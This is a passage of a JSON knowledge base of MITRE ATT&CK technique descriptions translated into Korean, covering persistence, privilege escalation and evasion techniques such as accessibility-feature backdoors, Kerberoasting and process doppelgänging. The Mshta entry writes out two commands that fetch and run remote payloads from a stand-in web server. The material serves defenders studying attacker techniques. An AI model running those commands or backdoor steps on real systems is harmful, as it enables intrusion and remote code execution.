설정됩니다. 이 값은 시스템이 비정상적으로 종료된 경우 Windows가 시작 시 하드 디스크의 파일 시스템 무결성을 검사하도록 합니다. 적대자는 부팅 시 자동으로 실행될 다른 프로그램이나 프로세스를 이 레지스트리 값에 추가할 수 있습니다.\n\n적대자는 이러한 구성 위치를 사용하여 악성코드, 예를 들어 원격 액세스 도구를 실행하여 시스템 재부팅을 통한 지속성을 유지할 수 있습니다. 적대자는 레지스트리 항목이 합법적인 프로그램과 연결된 것처럼 보이도록 [위장]을 사용할 수도 있습니다.",
    "external_id": "T1060",
    "modified": "2020-01-23T22:05:32.409Z",
    "translated": true
  },
  {
    "title": "Shortcut Modification",
    "description": "단축 아이콘이나 심볼릭 링크는 다른 파일이나 프로그램을 참조하는 방법으로, 단축 아이콘이 클릭되거나 시스템 시작 프로세스에 의해 실행될 때 열리거나 실행됩니다. 공격자는 지속성을 위해 도구를 실행하기 위해 단축 아이콘을 사용할 수 있습니다. 그들은 정당한 프로그램처럼 보이도록 가장하는 방법으로 간접적인 수단으로 새로운 단축 아이콘을 만들 수 있습니다. 공격자는 또한 대상 경로를 수정하거나 기존 단축 아이콘을 완전히 교체하여 그들의 도구가 의도된 정당한 프로그램 대신 실행되도록 할 수 있습니다.",
    "external_id": "T1023",
    "modified": "2020-01-24T19:36:41.805Z",
    "translated": true
  },
  {
    "title": "Multiband Communication",
    "description": "이 기술은 더 이상 사용되지 않아야 합니다.\n\n일부 공격자는 서로 다른 프로토콜 간의 통신을 분리할 수 있습니다. 하나는 수신 명령 및 제어를 위한 프로토콜이고, 다른 하나는 송신 데이터를 위한 프로토콜로, 이를 통해 특정 방화벽 제한을 우회할 수 있습니다. 분리는 무작위로 이루어질 수도 있어, 특정 통신에서 데이터 한계 알림을 피할 수 있습니다.",
    "external_id": "T1026",
    "modified": "2020-03-30T13:59:11.272Z",
    "translated": true
  },
  {
    "title": "Component Object Model Hijacking",
    "description": "구성 요소 객체 모델(COM)은 Windows 내에서 소프트웨어 구성 요소 간의 상호 작용을 가능하게 하는 시스템입니다. 적대자는 이 시스템을 사용하여 COM 참조 및 관계를 탈취함으로써 정당한 소프트웨어 대신 실행될 수 있는 악성 코드를 삽입할 수 있습니다. COM 객체를 탈취하려면 Windows 레지스트리에서 변경이 필요하여 정당한 시스템 구성 요소에 대한 참조를 교체해야 하며, 이로 인해 해당 구성 요소가 실행될 때 작동하지 않을 수 있습니다. 일반적인 시스템 작업을 통해 해당 시스템 구성 요소가 실행될 경우 적대자의 코드가 대신 실행됩니다. 적대자는 일정한 수준의 지속성을 유지하기 위해 자주 사용되는 객체를 탈취할 가능성이 높지만, 시스템의 눈에 띄는 기능을 침해하지 않도록 시스템의 안정성을 유지해야 탐지가 이루어질 수 있습니다.",
    "external_id": "T1122",
    "modified": "2020-11-10T18:19:44.725Z",
    "translated": true
  },
  {
    "title": "Accessibility Features",
    "description": "Windows에는 사용자가 로그인하기 전에 키 조합을 통해 실행할 수 있는 접근성 기능이 포함되어 있습니다. 공격자는 이러한 프로그램이 실행되는 방식을 수정하여 시스템에 로그인하지 않고도 명령 프롬프트나 백도어에 접근할 수 있습니다.\n\n두 가지 일반적인 접근성 프로그램은 shift 키를 다섯 번 눌렀을 때 실행되는 sethc.exe와 Windows + U 키 조합을 눌렀을 때 실행되는 utilman.exe입니다. sethc.exe 프로그램은 종종 \"스티키 키스\"라고 불리며, 원격 데스크톱 로그인 화면을 통해 인증되지 않은 접근을 위해 공격자에 의해 사용되어왔습니다.\n\nWindows 버전에 따라 공격자는 코드 무결성 향상으로 인해 이러한 기능을 다양한 방식으로 활용할 수 있습니다. 최신 버전의 Windows에서는 교체된 바이너리가 x64 시스템의 경우 디지털 서명을 받아야 하며, 바이너리는 %systemdir%\\에 존재해야 하고 Windows 파일 보호 또는 리소스 보호(WFP/WRP)로 보호되어야 합니다. 디버거 방법은 해당 접근성 기능 바이너리를 교체할 필요가 없기 때문에 잠재적인 해결 방법으로 발견되었을 가능성이 큽니다.\n\nWindows XP 및 이후 버전, Windows Server 2003/R2 및 이후 버전에서의 간단한 바이너리 교체의 경우, 예를 들어, 프로그램(utilman.exe)은 \"cmd.exe\"(또는 백도어 접근을 제공하는 다른 프로그램)로 교체될 수 있습니다. 그 후, 로그인 화면에서 적절한 키 조합을 누르면 교체된 파일이 SYSTEM 권한으로 실행됩니다.\n\nWindows Vista 및 이후 버전, Windows Server 2008 및 이후 버전에서의 디버거 방법의 경우, 예를 들어, \"utilman.exe\" 같은 접근성 프로그램에 대한 \"디버거\"로 \"cmd.exe\" 또는 백도어 접근을 제공하는 다른 프로그램을 구성하는 레지스트리 키를 수정할 수 있습니다. 레지스트리가 수정된 후, 로그인 화면에서 적절한 키 조합을 누르면 \"디버거\" 프로그램이 SYSTEM 권한으로 실행됩니다.\n\n비슷한 방식으로 활용될 수 있는 다른 접근성 기능도 존재합니다. \n\n* 화면 키보드: osk.exe\n* 확대경: Magnify.exe\n* 내레이터: Narrator.exe\n* 디스플레이 전환기: DisplaySwitch.exe\n* 앱 전환기: AtBroker.exe",
    "external_id": "T1015",
    "modified": "2020-05-13T20:37:30.008Z",
    "translated": true
  },
  {
    "title": "Parent PID Spoofing",
    "description": "적대자는 새로운 프로세스의 부모 프로세스 식별자(PPID)를 스푸핑하여 프로세스 모니터링 방어를 회피하거나 권한을 상승시킬 수 있습니다. 새로운 프로세스는 일반적으로 부모 또는 호출 프로세스에서 직접 생성되며, 명시적으로 지정되지 않는 한 그렇습니다. 새로운 프로세스의 PPID를 명시적으로 할당하는 방법 중 하나는 <code>CreateProcess</code> API 호출을 통해 수행하는 것으로, 사용할 PPID를 정의하는 매개변수를 지원합니다. 이 기능은 사용자 계정 컨트롤(UAC)과 같은 Windows 기능에서 사용되어 SYSTEM에 의해 요청된 상승된 프로세스가 생성된 후 PPID를 올바르게 설정합니다.\n\n적대자는 이러한 메커니즘을 악용하여 Office 문서에서 직접 프로세스 생성을 차단하는 방어를 회피하거나, 비정상적이거나 잠재적으로 악의적인 부모-자식 프로세스 관계를 겨냥한 분석을 회피할 수 있습니다. 예를 들어 PPID를 [PowerShell]이나 [Rundll32]가 아닌 [explorer.exe]로 스푸핑하는 방식입니다. 이 스푸핑은 악성 Office 문서 내의 VBA 스크립팅을 통해 수행할 수 있습니다.\n\nPPID를 명시적으로 할당하는 것은 또한 적절한 액세스 권한이 있는 경우 권한 상승을 가능하게 할 수 있습니다. 예를 들어, 권한이 있는 사용자 컨텍스트(예: 관리자)에 있는 적대자는 새로운 프로세스를 생성하고 부모를 SYSTEM으로 실행 중인 프로세스로 할당하여 새 프로세스가 상속된 액세스 토큰에 따라 상승할 수 있습니다.",
    "external_id": "T1502",
    "modified": "2020-02-18T18:23:31.546Z",
    "translated": true
  },
  {
    "title": "Keychain",
    "description": "키체인은 macOS가 WiFi 비밀번호, 웹사이트, 보안 노트, 인증서 및 Kerberos와 같은 여러 서비스 및 기능에 대한 사용자의 비밀번호와 자격 증명을 추적하는 기본 방법입니다. 키체인 파일은 ~/Library/Keychains/, /Library/Keychains/, /Network/Library/Keychains/에 위치합니다. 기본적으로 macOS에 내장된 보안 명령줄 유틸리티는 이러한 자격 증명을 관리하는 데 유용한 방법을 제공합니다.\n\n사용자는 키체인을 관리하기 위해 추가 자격 증명을 사용해야 합니다. 만약 공격자가 로그인 키체인에 대한 자격 증명을 알게 되면, 이 금고에 저장된 모든 다른 자격 증명에 접근할 수 있습니다. 기본적으로 키체인의 비밀번호는 사용자의 로그인 자격 증명입니다.",
    "external_id": "T1142",
    "modified": "2020-02-12T18:55:55.305Z",
    "translated": true
  },
  {
    "title": "Sudo",
    "description": "sudoers 파일인 /etc/sudoers는 어떤 사용자가 어떤 명령을 실행할 수 있는지와 어떤 터미널에서 실행할 수 있는지를 설명합니다. 또한 사용자가 다른 사용자 또는 그룹으로서 실행할 수 있는 명령도 설명합니다. 이는 사용자들이 대부분의 시간 동안 최소 권한 원칙에 따라 가능한 낮은 권한으로 실행하고 필요할 때만 다른 사용자나 권한으로 상승하도록 하며, 일반적으로 비밀번호 입력을 요구합니다. 그러나 sudoers 파일은 사용자가 비밀번호를 입력하지 않도록 설정할 수 있는 규칙도 포함할 수 있습니다. \n\n적대자는 이러한 구성 설정을 이용해 다른 사용자로써 명령을 실행하거나 더 높은 권한으로 프로세스를 생성할 수 있습니다. 하지만 이 파일을 수정하려면 상승된 권한이 필요합니다.",
    "external_id": "T1169",
    "modified": "2020-02-05T20:11:12.593Z",
    "translated": true
  },
  {
    "title": "LC_MAIN Hijacking",
    "description": "이 기술은 더 이상 사용되지 않아야 합니다.\n\nOS X 10.8부터 mach-O 바이너리는 실행을 위한 바이너리의 진입점을 가리키는 새로운 헤더인 LC_MAIN을 도입했습니다. 이전에는 동일한 효과를 달성하기 위해 LC_THREAD와 LC_UNIXTHREAD라는 두 개의 헤더가 사용되었습니다. 바이너리의 진입점은 악성 추가 코드(또는 다른 섹션이나 코드 공간)로 초기 실행을 흐르게 하도록 탈취될 수 있으며, 이후 피해자가 다르게 느끼지 않도록 초기 진입점으로 돌아올 수 있습니다. 이러한 방식으로 바이너리를 수정하면 파일 이름이나 응용 프로그램 경로가 여전히 동일하기 때문에 응용 프로그램 화이트리스트를 우회할 수 있습니다.",
    "external_id": "T1149",
    "modified": "2020-03-30T13:53:57.518Z",
    "translated": true
  },
  {
    "title": "Mshta",
    "description": "mshta.exe는 Microsoft HTML 응용 프로그램(HTA)을 실행하는 유틸리티입니다. HTA 파일은 <code>.hta</code>라는 파일 확장자를 가지고 있습니다. HTA는 독립형 응용 프로그램으로, 브라우저 외부에서 Internet Explorer의 동일한 모델과 기술을 사용하여 실행됩니다.\n\n적대적인 행위자들은 mshta.exe를 사용하여 신뢰할 수 있는 Windows 유틸리티를 통해 악성 .hta 파일과 Javascript 또는 VBScript의 실행을 프록시할 수 있습니다. 초기 침해와 코드 실행을 위한 mshta.exe를 활용하는 다양한 유형의 위협 사례가 여러 가지 있습니다.\n\nmshta.exe는 인라인 스크립트를 통해 파일을 실행할 수 있습니다: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\n또한 URL에서 직접 실행할 수도 있습니다: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nmshta.exe는 잠재적 사용을 고려하지 않는 애플리케이션 화이트리스트 솔루션을 우회하는 데 사용될 수 있습니다. mshta.exe가 Internet Explorer의 보안 컨텍스트 외부에서 실행되기 때문에 브라우저 보안 설정도 우회합니다.",
    "external_id": "T1170",
    "modified": "2022-01-19T21:19:03.910Z",
    "translated": true
  },
  {
    "title": "Pass the Ticket",
    "description": "Pass the ticket (PtT)는 Kerberos 티켓을 사용하여 계정의 비밀번호에 접근하지 않고 시스템에 인증하는 방법입니다. Kerberos 인증은 원격 시스템으로의 수평 이동의 첫 단계로 사용될 수 있습니다.\n\n이 기술에서는 유효한 Kerberos 티켓이 OS 자격 증명 덤핑을 통해 캡처됩니다. 사용자의 서비스 티켓 또는 티켓 발급 티켓(TGT)을 얻을 수 있으며, 이는 접근 수준에 따라 다릅니다. 서비스 티켓은 특정 리소스에 접근할 수 있게 해주고, TGT는 티켓 발급 서비스(TGS)로부터 서비스 티켓을 요청하는 데 사용되어 사용자가 접근 권한을 가진 모든 리소스에 접근할 수 있습니다.\n\n실버 티켓은 Kerberos를 인증 메커니즘으로 사용하는 서비스에 대해 얻을 수 있으며, 특정 리소스와 그 리소스를 호스팅하는 시스템(예: SharePoint)에 접근하기 위한 티켓을 생성하는 데 사용됩니다.\n\n골든 티켓은 도메인에 대해 키 배포 서비스 계정인 KRBTGT 계정의 NTLM 해시를 사용하여 얻을 수 있으며, 이를 통해 Active Directory의 모든 계정에 대한 TGT를 생성할 수 있게 됩니다.",
    "external_id": "T1097",
    "modified": "2020-01-30T19:57:16.037Z",
    "translated": true
  },
  {
    "title": "Graphical User Interface",
    "description": "이 기술은 더 이상 사용되지 않습니다. 적절한 경우 원격 서비스를 사용하세요.\n\n그래픽 사용자 인터페이스(GUI)는 운영 체제와 상호 작용하는 일반적인 방법입니다. 공격자는 작업 중에 시스템의 GUI를 사용할 수 있으며, 일반적으로 원격 상호 작용 세션을 통해 정보를 검색하고 마우스 더블 클릭 이벤트, Windows 실행 명령 또는 모니터링하기 어려운 다른 상호 작용을 통해 파일을 실행합니다.",
    "external_id": "T1061",
    "modified": "2020-03-30T13:38:08.738Z",
    "translated": true
  },
  {
    "title": "Dylib Hijacking",
    "description": "macOS와 OS X는 필요한 동적 라이브러리(dylib)를 프로그램에 로드하기 위해 검색 경로에 따라 찾는 공통 방법을 사용합니다. 공격자는 애매한 경로를 이용하여 dylib를 심어 권한 상승이나 지속성을 얻을 수 있습니다.\n\n일반적인 방법은 애플리케이션에서 사용하는 dylib를 확인한 후, 검색 경로에서 더 높은 위치에 동일한 이름을 가진 악성 버전을 심는 것입니다. 이는 일반적으로 dylib가 애플리케이션과 동일한 폴더에 있게 됩니다.\n\n프로그램이 현재 사용자보다 높은 권한 수준에서 실행되도록 구성되어 있다면, dylib가 애플리케이션에 로드될 때 해당 dylib도 그 높은 수준에서 실행됩니다. 이는 공격자가 권한 상승 기술로 사용할 수 있습니다.",
    "external_id": "T1157",
    "modified": "2021-03-30T00:51:57.919Z",
    "translated": true
  },
  {
    "title": "Web Services",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 제3자 웹 서비스에 대한 접근을 타협할 수 있습니다. GitHub, Twitter, Dropbox, Google, SendGrid 등과 같이 합법적인 사용자가 웹 기반 서비스를 등록할 수 있는 다양한 인기 웹사이트가 존재합니다. 적대자는 합법적인 사용자의 웹 서비스 접근 권한을 인수하려 하며, 사이버 작전을 지원하기 위한 인프라로 해당 웹 서비스를 사용할 수 있습니다. 이러한 웹 서비스는 적대자 생애 주기의 후반 단계, 예를 들어 명령 및 제어, 웹 서비스 통한 데이터 유출 또는 피싱 중에 악용될 수 있습니다. Google이나 Twitter와 같은 일반적인 서비스를 사용하면 적대자가 예상되는 노이즈에 숨기 더 쉬워집니다. 웹 서비스를 활용함으로써, 특히 합법적인 사용자로부터 접근 권한이 도용된 경우, 적대자는 자신들의 작전을 물리적으로 연결하기 어렵게 만들 수 있습니다. 또한, 타협된 웹 기반 이메일 서비스를 활용하면 적대자는 합법적인 도메인과 관련된 신뢰를 이용할 수 있습니다.",
    "external_id": "T1584.006",
    "modified": "2024-10-15T16:44:09.114Z",
    "translated": true
  },
  {
    "title": "DLL Side-Loading",
    "description": "프로그램은 실행 시간에 로드되는 DLL을 지정할 수 있습니다. 필수 DLL을 부적절하거나 모호하게 지정한 프로그램은 의도하지 않은 DLL이 로드되는 취약점에 노출될 수 있습니다. 사이드로딩 취약점은 Windows 사이드 바이 사이드(WinSxS) 매니페스트가 로드될 DLL의 특성에 대해 충분히 명확하지 않을 때 발생합니다. 공격자는 사이드로딩에 취약한 합법적인 프로그램을 이용하여 악의적인 DLL을 로드할 수 있습니다.\n\n공격자는 이 기술을 합법적이고 신뢰할 수 있는 시스템이나 소프트웨어 프로세스 내에서 수행하는 행동을 숨기는 수단으로 사용할 가능성이 높습니다.",
    "external_id": "T1073",
    "modified": "2020-03-20T14:28:39.529Z",
    "translated": true
  },
  {
    "title": "Kerberoasting",
    "description": "서비스 주체 이름(SPN)은 Windows 서비스의 각 인스턴스를 고유하게 식별하는 데 사용됩니다. 인증을 활성화하기 위해 Kerberos는 SPN이 최소한 하나의 서비스 로그인 계정과 연결되어 있어야 합니다. 유효한 Kerberos 티켓-부여 티켓(TGT)을 가진 공격자는 도메인 컨트롤러(DC)에서 모든 SPN에 대한 하나 이상의 Kerberos 티켓-부여 서비스(TGS) 서비스 티켓을 요청할 수 있습니다. 이러한 티켓의 일부는 RC4 알고리즘으로 암호화될 수 있으며, 이는 SPN과 관련된 서비스 계정의 Kerberos 5 TGS-REP etype 23 해시가 개인 키로 사용되므로 오프라인 공격에 취약합니다. 이와 같은 공격은 네트워크 트래픽에서 캡처한 서비스 티켓을 사용하여 실행될 수 있습니다. 크랙된 해시는 Persistence, Privilege Escalation 및 Lateral Movement를 가능하게 하여 유효한 계정에 접근할 수 있게 합니다.",
    "external_id": "T1208",
    "modified": "2020-10-20T19:30:10.297Z",
    "translated": true
  },
  {
    "title": "Trap",
    "description": "`trap` 명령은 프로그램과 셸이 인터럽트 신호를 받을 때 실행될 명령을 지정할 수 있게 해줍니다. 일반적인 상황은 스크립트가 `ctrl+c` 및 `ctrl+d`와 같은 일반적인 키보드 인터럽트를 처리하고 우아하게 종료할 수 있도록 허용하는 것입니다. 공격자는 이를 이용해 셸이 특정 인터럽트를 만났을 때 실행될 코드를 등록할 수 있으며, 이는 실행 권한을 얻거나 지속성을 유지하는 메커니즘으로 사용될 수 있습니다. 트랩 명령은 다음과 같은 형식을 가집니다: `trap '명령 목록' 신호` 여기서 \"명령 목록\"은 \"신호\"를 받을 때 실행됩니다.",
    "external_id": "T1154",
    "modified": "2020-01-24T14:18:13.478Z",
    "translated": true
  },
  {
    "title": "Disk Content Wipe",
    "description": "적대자는 특정 시스템 및 네트워크의 많은 시스템에 있는 저장 장치의 내용을 지워 시스템 및 네트워크 자원에 대한 가용성을 방해할 수 있습니다.\n\n적대자는 저장 장치의 내용을 부분적으로 또는 완전히 덮어쓰며 데이터를 저장 인터페이스를 통해 복구할 수 없게 만들 수 있습니다. 특정 디스크 구조나 파일을 지우는 대신 파괴적인 의도를 가진 적대자는 디스크 콘텐츠의 임의 부분을 지울 수 있습니다. 디스크 콘텐츠를 지우기 위해, 적대자는 하드 드라이브에 직접 접근하여 임의 크기의 디스크 부분을 무작위 데이터로 덮어쓸 수 있습니다. 적대자는 [RawDisk]와 같은 서드파티 드라이버를 활용하여 디스크 콘텐츠에 직접 접근하는 모습을 관찰되었습니다. 이 행동은 개별 파일 대신 디스크의 섹션을 지우기 때문에 [데이터 파괴]와는 구별됩니다.\n\n네트워크 전체의 가용성 중단을 목표로 하는 작전에서 목표 조직에 대한 영향을 극대화하기 위해, 디스크 콘텐츠를 지우는 데 사용되는 악성 소프트웨어는 네트워크 전파 기능을 갖출 수 있으며, [유효한 계정], [운영 체제 자격 증명 덤핑], [윈도우 관리자 공유]와 같은 추가 기술을 활용합니다.",
    "external_id": "T1488",
    "modified": "2020-02-20T22:07:27.495Z",
    "translated": true
  },
  {
    "title": "Password Filter DLL",
    "description": "윈도우 비밀번호 필터는 도메인 및 로컬 계정에 대한 비밀번호 정책 시행 메커니즘입니다. 필터는 비밀번호 정책에 대해 잠재적인 비밀번호를 검증하는 방법을 포함하는 동적 링크 라이브러리(DLL)로 구현됩니다. 필터 DLL은 로컬 계정의 경우 로컬 컴퓨터에, 도메인 계정의 경우 도메인 컨트롤러에 위치할 수 있습니다.\n\n새로운 비밀번호를 보안 계정 관리자(SAM)에 등록하기 전에 로컬 보안 기관(LSA)은 각 등록된 필터에 검증을 요청합니다. 모든 등록된 필터가 검증을 인정하기 전까지는 잠재적인 변경 사항이 적용될 수 없습니다.\n\n적대자는 악성 비밀번호 필터를 등록하여 로컬 컴퓨터 및/또는 전체 도메인에서 자격 증명을 수집할 수 있습니다. 적절한 검증을 수행하기 위해 필터는 LSA로부터 일반 텍스트 자격 증명을 받아야 합니다. 악성 비밀번호 필터는 비밀번호 요청이 있을 때마다 이러한 일반 텍스트 자격 증명을 수신하게 됩니다.",
    "external_id": "T1174",
    "modified": "2020-02-11T19:06:18.818Z",
    "translated": true
  },
  {
    "title": "Data Compressed",
    "description": "적대자는 유출 전에 수집된 데이터를 압축하여 휴대 가능하게 만들고 네트워크를 통해 전송되는 데이터 양을 최소화할 수 있습니다. 압축은 유출 채널과는 별도로 수행되며, 맞춤 프로그램이나 알고리즘, 또는 7zip, RAR, ZIP, zlib과 같은 더 일반적인 압축 라이브러리나 유틸리티를 사용하여 이루어집니다.",
    "external_id": "T1002",
    "modified": "2020-03-30T03:09:45.384Z",
    "translated": true
  },
  {
    "title": "Credentials in Files",
    "description": "적대자는 로컬 파일 시스템 및 원격 파일 공유에서 비밀번호가 포함된 파일을 검색할 수 있습니다. 이러한 파일은 사용자가 자신의 자격 증명을 저장하기 위해 만든 파일, 개인 그룹을 위한 공유 자격 증명 저장소, 시스템이나 서비스의 비밀번호가 포함된 구성 파일, 또는 내장된 비밀번호가 포함된 소스 코드/바이너리 파일일 수 있습니다.\n\n백업 또는 저장된 가상 머신에서 비밀번호를 추출하는 것이 가능합니다. 비밀번호는 또한 Windows 도메인 컨트롤러에 저장된 그룹 정책 기본 설정에서 얻을 수 있습니다.\n\n클라우드 환경에서는 인증된 사용자 자격 증명이 종종 로컬 구성 및 자격 증명 파일에 저장됩니다. 이러한 파일은 다른 머신에서 복사하여 재사용할 수 있거나 내용을 읽어서 파일 복사 없이 인증에 사용될 수 있습니다.",
    "external_id": "T1081",
    "modified": "2021-03-08T10:33:00.910Z",
    "translated": true
  },
  {
    "title": "Netsh Helper DLL",
    "description": "Netsh.exe(일반적으로 Netshell이라고도 함)는 시스템의 네트워크 구성과 상호작용하기 위해 사용되는 명령줄 스크립트 유틸리티입니다. 이 도구의 기능을 확장하기 위해 헬퍼 DLL을 추가하는 기능을 포함하고 있습니다. 등록된 netsh.exe 헬퍼 DLL의 경로는 Windows 레지스트리에 <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>로 입력됩니다.\n\n적대 세력은 netsh.exe와 헬퍼 DLL을 사용하여 임의의 코드를 지속적으로 실행하는 프록시를 생성할 수 있습니다. 이는 netsh.exe가 다른 지속성 기술과 함께 자동으로 실행되거나, 시스템에서 netsh.exe를 정상적으로 실행하는 일부 지속성 소프트웨어가 있을 때 발생할 수 있습니다. 예를 들어, netsh.exe를 호출하는 일부 VPN 소프트웨어가 있습니다.\n\nCobalt Strike의 페이로드를 netsh.exe 헬퍼 DLL을 사용하여 로드하는 개념 증명 코드가 존재합니다.",
    "external_id": "T1128",
    "modified": "2020-01-24T14:27:28.869Z",
    "translated": true
  },
  {
    "title": "Exploits",
    "description": "적대자들은 타겟팅 중 사용할 수 있는 악용 코드를 개발할 수 있습니다. 악용 코드는 컴퓨터 하드웨어나 소프트웨어에서 의도하지 않거나 예상치 못한 행동을 유발하기 위해 버그나 취약점을 이용합니다. 적대자는 온라인에서 악용 코드를 찾거나 수정하거나 공급업체로부터 구매하는 대신, 자신의 악용 코드를 개발할 수 있습니다. 적대자는 악용 코드 개발 노력을 집중하기 위해 취약점을 통해 얻은 정보를 사용할 수 있습니다. 악용 코드 개발 과정의 일환으로, 적대자는 퍼징이나 패치 분석과 같은 방법을 통해 악용 가능한 취약점을 발견할 수 있습니다.\n\n합법적인 개발 노력과 마찬가지로, 악용 코드를 개발하기 위해 필요한 다양한 기술 세트가 요구될 수 있습니다. 필요한 기술은 내부에 있을 수도 있고, 외부 계약을 통해 조달해야 할 수도 있습니다. 계약자의 사용은 적대자의 악용 코드 개발 능력의 연장으로 간주될 수 있으며, 적대자가 요구사항을 형성하는 데 역할을 하고 악용 코드에 대한 초기 독점적 권리를 유지하는 경우에 해당합니다.\n\n적대자는 적대자 생애 주기의 다양한 단계에서 악용 코드를 사용할 수 있습니다.",
    "external_id": "T1587.004",
    "modified": "2021-04-15T03:07:53.803Z",
    "translated": true
  },
  {
    "title": "Local Job Scheduling",
    "description": "리눅스 및 macOS 시스템에서는 사전 예약 및 주기적인 백그라운드 작업을 생성하는 여러 방법이 지원됩니다: cron, at 및 launchd. Windows 시스템의 작업 예약과 달리 리눅스 기반 시스템에서의 작업 예약은 확립된 원격 세션(예: SSH)과 함께 사용되지 않는 한 원격으로 수행할 수 없습니다.\n\n### cron\n\n시스템 전체의 cron 작업은 `/etc/crontab` 파일, `/etc/cron.d/` 디렉토리 또는 Cron 데몬이 지원하는 다른 위치를 수정하여 설치되며, 사용자별 cron 작업은 특정 형식의 crontab 파일을 사용하는 crontab을 통해 설치됩니다. 이 방법은 macOS 및 리눅스 시스템에서 작동합니다.\n\n이러한 방법은 사용자 상호작용 없이 백그라운드에서 특정 주기적 간격으로 명령이나 스크립트를 실행할 수 있습니다. 공격자는 작업 예약을 사용하여 시스템 시작 시 프로그램을 실행하거나 예약된 기반으로 지속성을 위해 실행할 수 있습니다. 이는 수평 이동의 일환으로 실행을 수행하거나, 루트 권한을 얻거나, 특정 계정의 컨텍스트에서 프로세스를 실행하기 위해 사용될 수 있습니다.\n\n### at\n\nat 프로그램은 POSIX 기반 시스템(예: macOS 및 리눅스)에서 프로그램이나 스크립트 작업을 나중의 날짜 및/또는 시간에 실행하도록 예약하는 또 다른 방법이며, 동일한 목적에도 사용할 수 있습니다.\n\n### launchd\n\n각 launchd 작업은 Launch Daemon 또는 Launch Agent와 유사한 다른 구성 속성 목록(plist) 파일로 설명되며, 추가적으로 시간 값의 사전을 포함한 `StartCalendarInterval`라는 키가 있습니다. 이는 macOS 및 OS X에서만 작동합니다.",
    "external_id": "T1168",
    "modified": "2021-03-30T00:51:58.374Z",
    "translated": true
  },
  {
    "title": "Setuid and Setgid",
    "description": "Linux나 macOS에서 애플리케이션에 setuid 또는 setgid 비트를 설정하면 해당 애플리케이션이 각각 소유 사용자나 그룹의 권한으로 실행된다는 의미입니다. 일반적으로 애플리케이션은 현재 사용자의 컨텍스트에서 실행되며, 애플리케이션을 소유하는 사용자나 그룹과는 관계가 없습니다. 프로그램이 정상적으로 작동하기 위해서는 상승된 권한의 컨텍스트에서 실행해야 하는 경우가 있지만, 이를 실행하는 사용자가 상승된 권한을 필요로 하지 않을 때도 있습니다. sudoers 파일에 항목을 추가하는 대신, 모든 사용자가 자신의 애플리케이션에 대해 setuid 또는 setgid 플래그를 설정할 수 있습니다. 이러한 비트는 <code>ls -l</code> 명령어를 통해 파일 속성을 조회할 때 \"x\" 대신 \"s\"로 표시됩니다. <code>chmod</code> 프로그램은 비트마스킹을 통해 이러한 비트를 설정할 수 있으며, <code>chmod 4777 [파일]</code> 또는 간편한 이름 지정 방법인 <code>chmod u+s [파일]</code>를 사용할 수 있습니다.\n\n적은 자는 이를 이용하여 셸 탈출을 하거나 setuid 또는 setgid 비트를 가진 애플리케이션의 취약점을 악용하여 다른 사용자의 컨텍스트에서 코드를 실행할 수 있습니다. 또한, 적은 자는 자신의 악성 소프트웨어에 이 메커니즘을 사용하여 향후 상승된 권한의 컨텍스트에서 실행될 수 있도록 할 수 있습니다.",
    "external_id": "T1166",
    "modified": "2020-02-05T20:09:22.650Z",
    "translated": true
  },
  {
    "title": "Web Shell",
    "description": "웹 셸은 적이 네트워크로의 게이트웨이로 사용하기 위해 공개적으로 접근 가능한 웹 서버에 배치된 웹 스크립트입니다. 웹 셸은 웹 서버를 호스팅하는 시스템에서 실행할 수 있는 함수 집합이나 명령줄 인터페이스를 제공할 수 있습니다. 서버 측 스크립트 외에도, 웹 셸은 웹 서버와 통신하는 데 사용되는 클라이언트 인터페이스 프로그램을 가질 수 있습니다.\n\n웹 셸은 적의 주요 접근 방법이 탐지되어 제거될 경우 백업 접근 수단이나 지속성 메커니즘으로 사용될 수 있습니다.",
    "external_id": "T1100",
    "modified": "2020-03-19T20:22:02.163Z",
    "translated": true
  },
  {
    "title": "Process Doppelgänging",
    "description": "Windows Transactional NTFS (TxF)는 안전한 파일 작업을 수행하기 위한 방법으로 Vista에서 도입되었습니다. 데이터 무결성을 보장하기 위해, TxF는 주어진 시간에 파일에 쓸 수 있는 트랜잭션 핸들을 하나만 허용합니다. 쓰기 핸들 트랜잭션이 종료될 때까지 모든 다른 핸들은 작성자를 격리하며, 핸들이 열릴 당시 존재했던 커밋된 버전의 파일만 읽을 수 있습니다. 데이터 손상을 방지하기 위해, TxF는 쓰기 트랜잭션 중 시스템이나 애플리케이션이 실패할 경우 자동 롤백을 수행합니다.\n\n비록 사용 중단되었지만, TxF 응용 프로그래밍 인터페이스 (API)는 Windows 10에서도 여전히 활성화되어 있습니다.\n\n적대자는 TxF를 활용하여 파일 없는 변형인 프로세스 더블갱잉을 수행할 수 있습니다. 프로세스 할로잉과 유사하게, 프로세스 더블갱잉은 합법적인 프로세스의 메모리를 교체하여 방어와 탐지를 회피할 수 있는 악성 코드를 숨겨 실행할 수 있게 합니다. 프로세스 더블갱잉의 TxF 사용은 NtUnmapViewOfSection, VirtualProtectEx 및 SetThreadContext와 같은 고도로 모니터링되는 API 기능을 피하는 데에도 도움이 됩니다.\n\n프로세스 더블갱잉은 다음 네 단계로 구현됩니다:\n\n* 트랜잭트 – 합법적인 실행 파일을 사용하여 TxF 트랜잭션을 생성한 후, 파일을 악성 코드로 덮어씌웁니다. 이러한 변경 사항은 격리되며 트랜잭션의 맥락 내에서만 볼 수 있습니다.\n* 로드 – 메모리의 공유 섹션을 생성하고 악성 실행 파일을 로드합니다.\n* 롤백 – 원래 실행 파일에 대한 변경 사항을 되돌려서 파일 시스템에서 악성 코드를 효과적으로 제거합니다.\n* 애니메이트 – 오염된 메모리 섹션에서 프로세스를 생성하고 실행을 시작합니다.",
    "external_id": "T1186",
    "modified": "2020-01-14T17:23:25.111Z",
    "translated": true
  },
  {
    "title": "SSH Hijacking",
